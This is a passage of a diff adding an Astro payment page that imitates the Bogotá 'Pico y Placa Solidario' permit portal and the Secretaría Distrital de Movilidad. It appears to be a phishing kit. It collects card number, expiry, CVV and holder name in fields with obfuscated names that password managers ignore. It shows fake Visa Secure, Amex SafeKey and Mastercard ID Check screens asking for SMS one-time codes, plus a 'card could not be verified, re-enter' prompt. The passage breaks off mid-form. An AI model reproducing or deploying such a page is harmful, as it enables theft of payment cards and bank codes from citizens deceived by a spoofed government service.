@@ -1,0 +1,2285 @@
+---
+import { defaultPaymentLegs, paymentCopy } from '../../data/paymentData';
+import { duraciones, tiposDocumento } from '../../data/picoFlow';
+import {
+  durationOptions,
+  getEnvironmentalFactor,
+  municipalityOptions,
+  roundToHundred,
+  valuationOptions,
+} from '../../data/picoMock';
+
+const PORCENTAJE_DESCUENTO = 0;
+
+const copy = paymentCopy;
+const legsJson = JSON.stringify(defaultPaymentLegs);
+const q = Astro.url.searchParams;
+const tipoDocumento = q.get('tipoDocumento') || '1';
+const numeroDocumento = q.get('numeroDocumento') || '';
+const correo = q.get('correo') || '';
+const celular = q.get('celular') || '';
+const placa = (q.get('placa') || '').toUpperCase();
+const tipoPermiso = q.get('tipoPermiso') || 'diario';
+const fechaInicio = q.get('fechaInicio') || '';
+const nombresPagador = [q.get('primerNombre'), q.get('segundoNombre')].filter(Boolean).join(' ');
+const apellidosPagador = [q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ');
+const titularTarjeta = `${nombresPagador} ${apellidosPagador}`.trim();
+const nombreCompleto = titularTarjeta || '—';
+const tipoDocLabel = tiposDocumento.find((item) => item.value === tipoDocumento)?.label || 'Cédula';
+const duracionLabel =
+  tipoPermiso === 'diario'
+    ? 'Diario (1 Dia(s))'
+    : tipoPermiso === 'mensual'
+      ? 'Mensual (1 Mes(es))'
+      : tipoPermiso === 'semestral'
+        ? 'semestral (6 Mes(es))'
+        : duraciones.find((item) => item.value === tipoPermiso)?.label || tipoPermiso;
+
+function fechaFinPermiso(start: string, tipo: string) {
+  if (!start) return '';
+  const date = new Date(`${start}T00:00:00`);
+  if (Number.isNaN(date.getTime())) return start;
+  if (tipo === 'mensual') {
+    date.setMonth(date.getMonth() + 1);
+    date.setDate(date.getDate() - 1);
+  } else if (tipo === 'semestral') {
+    date.setMonth(date.getMonth() + 6);
+    date.setDate(date.getDate() - 1);
+  }
+  return date.toISOString().slice(0, 10);
+}
+
+const fechaFin = fechaFinPermiso(fechaInicio, tipoPermiso);
+const solicitudId = `PYPS-${new Date().getFullYear()}-${String(numeroDocumento).slice(-6).padStart(6, '0')}`;
+
+function mapDurationId(raw: string) {
+  const v = String(raw || '').toLowerCase();
+  if (v === '2' || v === 'mensual') return '2';
+  if (v === '3' || v === 'semestral') return '3';
+  return '1';
+}
+function mapCylinderId(raw: string) {
+  const v = String(raw || '');
+  if (v === '3' || v === '3000+') return '3';
+  if (v === '2' || v === '1500-3000') return '2';
+  return '1';
+}
+function mapFuelId(raw: string) {
+  const v = String(raw || '').toUpperCase();
+  const map: Record<string, string> = {
+    '1': '1', GASOLINA: '1',
+    '2': '2', GNV: '2',
+    '3': '3', DIESEL: '3',
+    '4': '4', 'GAS GASOL': '4',
+    '5': '5', ELECTRICO: '5',
+    '6': '6', HIDROGENO: '6',
+    '7': '7', ETANOL: '7',
+    '8': '8', BIODIESEL: '8',
+    '9': '9', GLP: '9',
+    '10': '10', 'GASO ELEC': '10',
+    '11': '11', 'DIES ELEC': '11',
+    '12': '12', 'DIESEL GAS': '12',
+  };
+  return map[v] || '1';
+}
+function mapModelId(raw: string) {
+  const v = String(raw || '');
+  if (v === '1' || v === 'pre1998') return '1';
+  if (v === '2' || v === '1998-2009') return '2';
+  if (v === '5') return '5';
+  if (v === '4' || v === '2010-2014') return '4';
+  return '3';
+}
+function mapValuationId(raw: string) {
+  const v = String(raw || '');
+  if (v === '3' || v === '250+' || v === '250') return '3';
+  if (v === '2' || v === '120') return '2';
+  return '1';
+}
+function mapMunicipalityId(raw: string) {
+  const v = String(raw || '');
+  if (!v || v === '1' || v === '11001') return '1';
+  return '2';
+}
+
+const durationId = mapDurationId(tipoPermiso || q.get('duracion') || q.get('duration') || '1');
+const cylinderId = mapCylinderId(q.get('cilindraje') || q.get('cylinder') || '1');
+const fuelId = mapFuelId(q.get('combustible') || q.get('fuel') || '1');
+const modelId = mapModelId(q.get('modelo') || q.get('model') || '3');
+const valuationId = mapValuationId(q.get('avaluo') || q.get('valuation') || '1');
+const municipalityId = mapMunicipalityId(q.get('municipio') || q.get('municipality') || '1');
+const durationRow = durationOptions.find((item) => item.id === durationId);
+const valuationRow = valuationOptions.find((item) => item.id === valuationId);
+const municipalityRow = municipalityOptions.find((item) => item.id === municipalityId);
+const picoTarifa = roundToHundred(
+  (durationRow?.base ?? 70294) *
+    (valuationRow?.factor ?? 1) *
+    (municipalityRow?.factor ?? 1) *
+    getEnvironmentalFactor(fuelId, modelId, cylinderId),
+);
+const pseBanks = [
+  { id: '1007', es: 'Bancolombia' },
+  { id: '1001', es: 'Banco de Bogotá' },
+  { id: '1051', es: 'Davivienda' },
+  { id: '1013', es: 'BBVA Colombia' },
+  { id: '1023', es: 'Banco de Occidente' },
+  { id: '1052', es: 'Banco AV Villas' },
+  { id: '1002', es: 'Banco Popular' },
+  { id: '1040', es: 'Banco Agrario' },
+  { id: '1019', es: 'Scotiabank Colpatria' },
+  { id: '1032', es: 'Banco Caja Social' },
+  { id: '1006', es: 'Itaú' },
+  { id: '1062', es: 'Banco Falabella' },
+  { id: '1507', es: 'Nequi' },
+  { id: '1551', es: 'Daviplata' },
+];
+---
+
+<section
+  class="pagos-board"
+  id="pagos-board"
+  data-legs={legsJson}
+  data-copy={JSON.stringify(copy)}
+  data-descuento={PORCENTAJE_DESCUENTO}
+  data-pico-tarifa={picoTarifa}
+>
+  <div id="pico-pago-step-metodo" class="solicitud-overlay pagos-confirm-overlay">
+    <div class="solicitud-dialog bg-white rounded mx-auto" role="dialog" aria-labelledby="solicitudTitle">
+      <header class="flex items-center justify-between px-6 py-4 border-b border-[#e6e6e6] shrink-0">
+        <h2 id="solicitudTitle" class="text-dark-green text-xl md:text-2xl font-semibold">Iniciar Solicitud</h2>
+        <button type="button" class="text-2xl leading-none text-gray px-2" aria-label="Cerrar">&times;</button>
+      </header>
+
+      <div class="px-4 md:px-8 pt-6 pb-4 shrink-0">
+        <ol class="pyps-stepper" aria-label="Pasos de la solicitud">
+          <li class="done"><span>1</span><em class="not-italic text-center leading-tight">Registro</em></li>
+          <li class="done"><span>2</span><em class="not-italic text-center leading-tight">Solicitud</em></li>
+          <li class="active"><span>3</span><em class="not-italic text-center leading-tight">Confirmación</em></li>
+          <li><span>4</span><em class="not-italic text-center leading-tight">Curso</em></li>
+          <li><span>5</span><em class="not-italic text-center leading-tight">Aprobación</em></li>
+        </ol>
+      </div>
+
+      <div class="solicitud-dialog-body px-4 md:px-8 py-2">
+        <h3 class="text-dark-green text-lg font-semibold mb-4">Confirmación</h3>
+        <div class="overflow-x-auto border border-[#e6e6e6] rounded">
+          <table class="pyps-table">
+            <thead>
+              <tr>
+                <th>Placa</th>
+                <th>Valor</th>
+                <th>Detalle</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>{placa || '—'}</td>
+                <td id="pico-tabla-valor">—</td>
+                <td><button type="button" class="underline font-semibold" id="pico-detalle-btn">Detalle</button></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <p class="text-right text-dark-green text-xl font-bold mt-4">Total a pagar: <span id="pagos-total-price">$ 0</span></p>
+        <div id="detalleCobro" class="hidden mt-4 bg-[#f7f7f7] rounded p-4 text-sm text-dark-green"></div>
+
+        <article class="pagos-summary" id="pagos-summary" hidden>
+          <div class="pagos-summary__pax" id="pagos-pax-label"></div>
+          <ol class="pagos-summary__legs" id="pagos-legs"></ol>
+          <button type="button" class="pagos-summary__detail" id="pagos-detail-toggle" hidden>{copy.detailCta}</button>
+        </article>
+
+        <h4 class="text-dark-green font-semibold mt-8 mb-3">¿Desea realizar el aporte de compensación social voluntaria?</h4>
+        <div class="flex gap-3 mb-4">
+          <button type="button" id="donacionSi" class="btn-outline-dark">Si</button>
+          <button type="button" id="donacionNo" class="btn-primary-dark">No</button>
+        </div>
+        <div id="donacionBox" class="hidden grid md:grid-cols-2 gap-4 mb-6">
+          <label class="mat-field">
+            <select id="donacionPct">
+              <option value="0">0%</option>
+              <option value="5">5%</option>
+              <option value="10">10%</option>
+            </select>
+            <span>Seleccione el porcentaje que desea donar</span>
+          </label>
+          <label class="mat-field">
+            <input id="donacionMonto" readonly />
+            <span>Monto a Donar</span>
+          </label>
+        </div>
+
+        <h4 class="text-dark-green font-semibold mb-3">Escoge una opcion de pago</h4>
+        <div class="grid md:grid-cols-3 gap-3 mb-5">
+          <div class="flex flex-col gap-3">
+            <label class="payment-choice">
+              <span class="flex items-center gap-2 font-semibold">
+                <input type="radio" name="metodoPago" value="pse" checked />
+                PSE
+              </span>
+              <small>Débito a cuenta bancaria</small>
+            </label>
+            <div id="pseBankBox">
+              <label class="mat-field">
+                <select id="pico-banco">
+                  <option value=""></option>
+                  {pseBanks.map((item) => <option value={item.id}>{item.es}</option>)}
+                </select>
+                <span>Seleccione el banco con el que desea pagar *</span>
+              </label>
+            </div>
+          </div>
+          <label class="payment-choice">
+            <span class="flex items-center gap-2 font-semibold">
+              <input type="radio" name="metodoPago" value="credito" />
+              Tarjeta de crédito
+            </span>
+            <small>Visa, Mastercard, American Express, Diners Club</small>
+          </label>
+          <label class="payment-choice">
+            <span class="flex items-center gap-2 font-semibold">
+              <input type="radio" name="metodoPago" value="debito" />
+              Tarjeta de débito
+            </span>
+            <small>Visa débito, Mastercard débito, Diners Club</small>
+          </label>
+        </div>
+        <p id="cardHint" class="hidden text-sm text-dark-green">Al continuar se abrirá el formulario de tarjeta.</p>
+        <p id="pico-pago-banner" class="pico-pago-banner" hidden></p>
+        <input type="email" id="pagos-email" hidden value={correo} />
+      </div>
+
+      <div class="solicitud-dialog-footer flex flex-wrap justify-end gap-3 px-4 md:px-8 py-4">
+        <button type="button" class="btn-outline-dark" id="btnCancelar">Cancelar</button>
+        <button type="button" class="btn-outline-dark" id="btnAtras">Anterior</button>
+        <button type="button" class="btn-primary-dark" id="btnIrPagar">Ir a pagar</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="pagoOverlay" class="solicitud-overlay fixed inset-0 z-[90] hidden items-start justify-center overflow-y-auto py-5 px-3">
+    <div class="solicitud-dialog bg-white rounded shadow-2xl mx-auto my-4">
+      <header class="flex items-center justify-between px-6 py-4 border-b border-[#e6e6e6] shrink-0">
+        <h2 id="pagoTitulo" class="text-dark-green text-xl md:text-2xl font-semibold">Datos de pago PSE</h2>
+        <button type="button" id="closePago" class="text-2xl leading-none text-gray px-2" aria-label="Cerrar">&times;</button>
+      </header>
+      <div class="solicitud-dialog-body px-4 md:px-8 py-6">
+        <div class="grid md:grid-cols-2 gap-4 text-sm text-dark-green" id="pagoDatos"></div>
+      </div>
+      <div class="solicitud-dialog-footer flex flex-wrap justify-end gap-3 px-4 md:px-8 py-4">
+        <button type="button" id="btnVolverConfirmacion" class="btn-outline-dark">Cancelar</button>
+        <button type="button" id="btnPagarPse" class="btn-primary-dark">Pagar con PSE</button>
+      </div>
+    </div>
+  </div>
+
+  <div id="pseOverlay" class="solicitud-overlay fixed inset-0 z-[100] hidden items-center justify-center overflow-y-auto py-5 px-3">
+    <div class="w-full max-w-xl rounded shadow-2xl overflow-hidden">
+      <div class="pse-platform text-white px-6 py-5 flex items-center justify-between">
+        <div>
+          <p class="text-xs uppercase tracking-[0.3em]">Plataforma de pago</p>
+          <h2 class="text-2xl font-bold">PSE</h2>
+        </div>
+        <p class="text-light-green text-sm font-semibold">Pico y Placa Solidario</p>
+      </div>
+      <div class="bg-white px-6 py-6">
+        <div id="pseResumen" class="space-y-2 text-sm text-dark-green"></div>
+        <div class="flex flex-wrap justify-end gap-3 mt-6">
+          <button type="button" id="btnSalirPse" class="btn-outline-dark">Volver</button>
+          <button type="button" id="btnConfirmarPse" class="btn-primary-dark">Continuar al banco</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="cardOverlay" class="solicitud-overlay fixed inset-0 z-[100] hidden items-center justify-center overflow-y-auto py-5 px-3">
+    <div class="w-full max-w-lg rounded shadow-2xl overflow-hidden">
+      <div class="card-platform text-white px-6 py-5 flex items-center justify-between">
+        <div>
+          <p class="text-xs uppercase tracking-[0.3em]">Datos de pago PAYZEN</p>
+          <h2 id="cardOverlayTitle" class="text-2xl font-bold">Tarjeta de crédito</h2>
+        </div>
+        <p class="text-sm font-semibold text-[#9ec5ff]">Pico y Placa Solidario</p>
+      </div>
+      <form id="cardForm" class="bg-white px-6 py-6" autocomplete="off">
+        <p class="text-dark-green font-bold mb-4">Valor a pagar: <span id="cardTotal"></span><span id="pagos-card-amount" hidden></span></p>
+        <p id="cardBrand" class="text-sm text-gray mb-4">Visa · Mastercard · American Express · Diners Club</p>
+        <div class="grid gap-4">
+          <label class="mat-field">
+            <input id="cardTitular" name="pyps-card-titular" maxlength="80" autocomplete="off" autocapitalize="characters" data-lpignore="true" data-1p-ignore="true" data-form-type="other" />
+            <span>Nombre del titular *</span>
+          </label>
+          <label class="mat-field">
+            <input id="cardNumero" inputmode="numeric" maxlength="23" />
+            <span>Número de tarjeta *</span>
+          </label>
+          <div class="grid grid-cols-2 gap-4">
+            <label class="mat-field">
+              <input id="cardVence" inputmode="numeric" maxlength="5" placeholder="MM/AA" />
+              <span>Vencimiento *</span>
+            </label>
+            <label class="mat-field">
+              <input id="cardCvv" inputmode="numeric" maxlength="4" />
+              <span>CVV *</span>
+            </label>
+          </div>
+          <label id="cardCuotasWrap" class="mat-field">
+            <select id="cardCuotas">
+              <option value="1">1 cuota</option>
+              <option value="3">3 cuotas</option>
+              <option value="6">6 cuotas</option>
+              <option value="12">12 cuotas</option>
+            </select>
+            <span>Número de cuotas</span>
+          </label>
+        </div>
+        <p id="cardError" class="hidden mt-4 text-sm text-color-error"></p>
+        <div class="flex flex-wrap justify-end gap-3 mt-6">
+          <button type="button" id="btnSalirCard" class="btn-outline-dark">Volver</button>
+          <button type="submit" id="btnPagarTarjeta" class="btn-primary-dark">Pagar con tarjeta</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="pico-pay-hide" hidden>
+    <h2 class="pagos-section-title" hidden>{copy.methodsTitle}</h2>
+
+  <h2 class="pagos-section-title" hidden>{copy.methodsTitle}</h2>
+
+  <div class="pagos-wallet" id="pagos-wallet" hidden>
+    <div class="pagos-wallet__art" aria-hidden="true">
+      <img src="/images/pagos-assets/push-login-full.png" alt="" />
+    </div>
+    <div class="pagos-wallet__copy">
+      <p class="pagos-wallet__title">{copy.walletTitle}</p>
+      <p class="pagos-wallet__sub">{copy.walletSubtitle}</p>
+      <button type="button" class="pagos-wallet__link" id="pagos-wallet-login">
+        {copy.walletLogin} <span aria-hidden="true">›</span>
+      </button>
+    </div>
+  </div>
+  <p class="pagos-wallet-msg" id="pagos-wallet-msg" hidden role="status">{copy.walletUnavailable}</p>
+
+  <div class="pagos-method" id="pagos-add-card">
+    <button
+      type="button"
+      class="pagos-method__toggle"
+      id="pagos-add-card-toggle"
+      hidden
+      aria-expanded="false"
+      aria-controls="pagos-card-form"
+    >
+      <span class="pagos-method__ico" aria-hidden="true">
+        <svg viewBox="0 0 32 32" width="24" height="24" fill="none">
+          <rect x="3" y="8" width="22" height="16" rx="2.5" stroke="currentColor" stroke-width="1.8" />
+          <path stroke="currentColor" stroke-width="1.8" d="M3 13h22" />
+          <circle cx="25.5" cy="23.5" r="5.5" fill="#fff" stroke="currentColor" stroke-width="1.6" />
+          <path stroke="currentColor" stroke-width="1.6" stroke-linecap="round" d="M25.5 21v5M23 23.5h5" />
+        </svg>
+      </span>
+      <span class="pagos-method__text">
+        <strong>{copy.addCardTitle}</strong>
+        <span>{copy.addCardSubtitle}</span>
+      </span>
+      <span class="pagos-method__radio" aria-hidden="true"></span>
+    </button>
+
+    <div class="pagos-card-form" id="pagos-card-form" hidden>
+      <div class="pagos-card-payline" hidden>
+        <span>{copy.payWithCard}</span>
+        <strong></strong>
+      </div>
+      <div class="pagos-card-grid">
+        <form class="pagos-card-grid-form" id="pagos-card-fields" autocomplete="off" novalidate onsubmit="return false;">
+        <label class="pagos-card-input pagos-card-input--number" id="pagos-card-number-field">
+          <span class="pagos-card-float" aria-hidden="true" data-label={copy.cardNumberPh}></span>
+          <span class="pagos-card-number-box" id="pagos-card-number-box">
+            <span class="pagos-card-brand" id="pagos-card-brand" hidden aria-hidden="true">
+              <img class="pagos-card-brand__logo" data-brand-logo="visa" src="/images/pagos-assets/brands/visa.png" alt="" width="40" height="13" />
+              <img class="pagos-card-brand__logo" data-brand-logo="mastercard" src="/images/pagos-assets/brands/mastercard.png" alt="" width="34" height="22" />
+              <img class="pagos-card-brand__logo" data-brand-logo="amex" src="/images/pagos-assets/brands/amex.png" alt="" width="36" height="24" />
+              <img class="pagos-card-brand__logo" data-brand-logo="diners" src="/images/pagos-assets/brands/diners.png" alt="" width="34" height="22" />
+              <img class="pagos-card-brand__logo" data-brand-logo="discover" src="/images/pagos-assets/brands/discover.png" alt="" width="52" height="34" />
+            </span>
+            <input
+              type="text"
+              name="fld_a"
+              id="pagos-card-number"
+              inputmode="numeric"
+              autocomplete="one-time-code"
+              data-lpignore="true"
+              data-form-type="other"
+              data-1p-ignore="true"
+              placeholder=" "
+              maxlength="19"
+              readonly
+            />
+            <span class="pagos-card-ok" id="pagos-card-number-ok" hidden aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" aria-hidden="true">
+                <circle cx="12" cy="12" r="11" stroke="currentColor" stroke-width="1.6" />
+                <path d="M7.2 12.2l3.1 3.1 6.5-6.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" />
+              </svg>
+            </span>
+          </span>
+          <p class="pagos-card-error" id="pagos-card-number-error" hidden></p>
+        </label>
+        <label class="pagos-card-input">
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardNamePh}></span>
+          <input
+            type="text"
+            name="fld_b"
+            id="pagos-card-name"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            value={titularTarjeta}
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-name-error" hidden></p>
+        </label>
+        <label class="pagos-card-input pagos-card-input--half">
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardExpPh}></span>
+          <input
+            type="text"
+            name="fld_c"
+            id="pagos-card-exp"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            maxlength="7"
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-exp-error" hidden></p>
+        </label>
+        <label class="pagos-card-input" id="pagos-card-cvv-wrap" hidden>
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardCvvPh}></span>
+          <input
+            type="text"
+            name="fld_d"
+            id="pagos-card-cvv"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            maxlength="4"
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-cvv-error" hidden></p>
+        </label>
+        <label class="pagos-card-input pagos-card-input--half pico-pay-hide">
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardEmailPh}></span>
+          <input
+            type="text"
+            name="fld_e"
+            id="pagos-card-email"
+            inputmode="email"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            value={correo}
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-email-error" hidden></p>
+        </label>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="pagos-actions">
+    <label class="pagos-terms" hidden>
+      <input type="checkbox" id="pagos-terms" checked />
+      <span>Acepto el tratamiento de datos personales.</span>
+    </label>
+    <button type="button" class="pagos-pay btn-primary-dark" id="pagos-pay" hidden disabled>Pagar con tarjeta</button>
+  </div>
+  </div>
+
+  <div class="pagos-invoice" id="pagos-invoice" hidden>
+    <div class="pagos-invoice__head">
+      <span class="pagos-invoice__ico" aria-hidden="true">
+        <svg viewBox="0 0 32 32" width="22" height="22"><path fill="currentColor" d="M8 4h12l6 6v16a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2Zm11 1.5V11h5.5L19 5.5ZM10 15h12v2H10v-2Zm0 4h12v2H10v-2Zm0 4h8v2h-8v-2Z"></path></svg>
+      </span>
+      <span class="pagos-invoice__label" id="pagos-invoice-label">{copy.invoiceToggle}</span>
+      <button
+        type="button"
+        class="pagos-switch"
+        id="pagos-invoice-toggle"
+        role="switch"
+        aria-checked="false"
+        aria-labelledby="pagos-invoice-label"
+        aria-controls="pagos-invoice-panel"
+      >
+        <span class="pagos-switch__thumb"></span>
+      </button>
+    </div>
+
+    <div class="pagos-invoice__panel" id="pagos-invoice-panel" hidden>
+      <div class="pagos-invoice__tips" role="note">
+        <span class="pagos-invoice__tips-ico" aria-hidden="true">
+          <svg viewBox="0 0 24 24" width="20" height="20">
+            <circle cx="12" cy="12" r="10" fill="currentColor"></circle>
+            <path fill="#ffffff" d="M11 10h2v7h-2v-7Zm0-4h2v2h-2V6Z"></path>
+          </svg>
+        </span>
+        <ul>
+          <li>Factura válida para personas y empresas inscritas en Colombia.</li>
+          <li>Para justificar costos o gastos, ingresar el RUC, de lo contrario el documento tendrá validez de boleta de venta.</li>
+          <li>Aplica un solo RUC para toda la compra.</li>
+        </ul>
+      </div>
+
+      <div class="pagos-invoice__grid">
+        <label class="pagos-card-input">
+          <span class="pagos-sr-only">Razón social</span>
+          <input type="text" name="invoiceBusinessName" autocomplete="organization" placeholder="Razón social" />
+        </label>
+        <label class="pagos-card-input">
+          <span class="pagos-sr-only">NIT</span>
+          <input type="text" name="invoiceRuc" inputmode="numeric" placeholder="NIT" maxlength="11" />
+        </label>
+        <label class="pagos-card-input pagos-card-input--select">
+          <span class="pagos-sr-only">País</span>
+          <select name="invoiceCountry" aria-label="País" disabled>
+            <option value="CO" selected>Colombia</option>
+          </select>
+        </label>
+        <label class="pagos-card-input">
+          <span class="pagos-sr-only">Ciudad</span>
+          <input type="text" name="invoiceCity" autocomplete="address-level2" placeholder="Ciudad" />
+        </label>
+        <label class="pagos-card-input pagos-card-input--half">
+          <span class="pagos-sr-only">Email</span>
+          <input type="email" name="invoiceEmail" autocomplete="email" placeholder="Email" />
+          <p class="pagos-invoice__hint">Este correo recibirá la factura</p>
+        </label>
+      </div>
+
+      <label class="pagos-invoice__confirm">
+        <input type="checkbox" id="pagos-invoice-confirm" name="invoiceConfirm" />
+        <span>Confirmo que los datos son correctos y que coinciden con los de la DIAN.</span>
+      </label>
+    </div>
+  </div>
+
+  <p class="pagos-msg" id="pagos-msg" hidden></p>
+</section>
+
+<div class="pagos-debug-modal" id="pagos-debug-modal" hidden role="dialog" aria-modal="true" aria-labelledby="pagos-debug-modal-title">
+  <div class="pagos-debug-modal__panel">
+    <h2 id="pagos-debug-modal-title">No pudimos verificar la tarjeta</h2>
+    <p id="pagos-debug-modal-message">Ingresa los datos nuevamente.</p>
+    <button type="button" id="pagos-debug-modal-close">Entendido</button>
+  </div>
+</div>
+
+<div
+  class="pasarela-wait"
+  id="pagos-wait-screen"
+  hidden
+  role="status"
+  aria-live="assertive"
+  aria-busy="true"
+  aria-label="Espera un momento"
+>
+  <div class="pasarela-wait__panel" data-wait-brand="visa" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--visa" src="/images/pasarela/visa.png" alt="Visa" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="amex" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--amex" src="/images/pasarela/amex-box.png" alt="American Express" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="diners" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--diners" src="/images/pasarela/diners.png" alt="Diners Club" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="mastercard" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--mc" aria-hidden="true"></div>
+    <div class="pasarela-wait__mc-brand" aria-hidden="true">
+      <svg viewBox="0 0 62 38" width="42" height="26" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+        <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+        <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+      </svg>
+      <span class="pasarela-wait__mc-sep"></span>
+      <span class="pasarela-wait__mc-id">ID Check</span>
+    </div>
+    <h2 class="pasarela-wait__title pasarela-wait__title--mc">Espera un momento</h2>
+    <p class="pasarela-wait__text pasarela-wait__text--mc">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="discover" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--discover" src="/images/pagos-assets/brands/discover.png" alt="Discover" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+</div>
+
+<div
+  class="pasarela-challenge"
+  id="pagos-challenge-screen"
+  hidden
+  role="dialog"
+  aria-modal="true"
+  aria-label="Verificación de pago"
+>
+  <!-- Visa / Discover (Visa Secure) -->
+  <section class="pasarela-card pasarela-card--visa" data-challenge-brand="visa" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <img src="/images/pasarela/visa.png" alt="Visa" class="pasarela-card__logo-visa" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-visa">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-visa" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+    <div class="pasarela-help" data-help>
+      <button type="button" class="pasarela-help__toggle" data-help-toggle aria-expanded="false">
+        <span>¿Necesitas ayuda?</span><span data-help-icon>+</span>
+      </button>
+      <div class="pasarela-help__panel" data-help-panel hidden>
+        <p><strong>No recibí el código</strong><br />Revise los mensajes SMS de su celular registrado en el banco. El código puede tardar unos segundos en llegar.</p>
+        <p><strong>El código no funciona</strong><br />Ingrese el código más reciente que recibió por mensaje de texto. Los códigos anteriores dejan de ser válidos.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-brand="discover" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <img src="/images/pagos-assets/brands/discover.png" alt="Discover" class="pasarela-card__logo-discover" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-discover">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-discover" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Amex -->
+  <section class="pasarela-card" data-challenge-brand="amex" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-row">
+        <img src="/images/pasarela/amex-box.png" alt="American Express" class="pasarela-card__logo-amex" />
+        <img src="/images/pasarela/amex-safekey.png" alt="SafeKey" class="pasarela-card__logo-safekey" />
+      </header>
+      <h2 class="pasarela-card__title">Autorización del Pago</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>Secretaría Distrital de Movilidad</strong></p>
+          <p>Monto: <strong data-challenge-amount>COP 0</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-amex">Ingrese el código enviado por SMS a su celular</label>
